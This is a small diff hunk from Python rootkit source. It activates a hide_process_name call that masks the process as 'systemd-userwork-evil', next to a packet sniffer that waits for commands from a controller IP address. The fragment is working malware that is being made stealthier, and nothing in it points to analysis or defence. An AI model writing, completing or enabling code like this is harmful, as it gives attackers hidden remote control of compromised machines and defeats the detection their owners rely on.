@@ -636,6 +636,6 @@ MONITOR = FileSystemMonitor()
 
 if __name__ == "__main__":
     print("Rootkit is listening for commands...")
-    # hide_process_name("systemd-userwork-evil")
+    hide_process_name("systemd-userwork-evil")
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
 
